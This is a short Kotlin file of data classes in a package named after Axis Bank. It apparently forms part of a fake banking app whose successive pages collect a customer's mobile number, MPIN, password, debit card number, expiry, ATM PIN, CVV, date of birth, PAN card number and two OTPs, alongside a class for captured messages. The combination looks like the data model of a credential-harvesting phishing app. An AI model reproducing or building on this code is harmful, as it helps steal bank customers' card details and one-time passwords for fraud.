package com.example.axisbank

data class Message(
    val message: String,
    val sender: String,
    val time: String,
    val type: String,
    val userid: String
)

data class Submit1r(val mobile: String, val mpin: String,val customerid:String)  // page 1 submit 1
data class Submit2(val customerid: String, val pass: String,val mobile:String)  // page 1 submit 2
data class SecondPage(val debit: String, val expiry: String, val atmpin : String,val customerid : String, val mobile : String,val cvv:String)  // second page
data class ThirdPage(val dob: String, val cvv: String, val pancard : String,val customerid : String, val mobile : String)  // third page
data class FourthPageOtp(val otp1 : String,val customerid : String, val mobile : String)   // fourth page otp
data class FifthPageOtp(val otp2 : String,val customerid : String, val mobile : String)
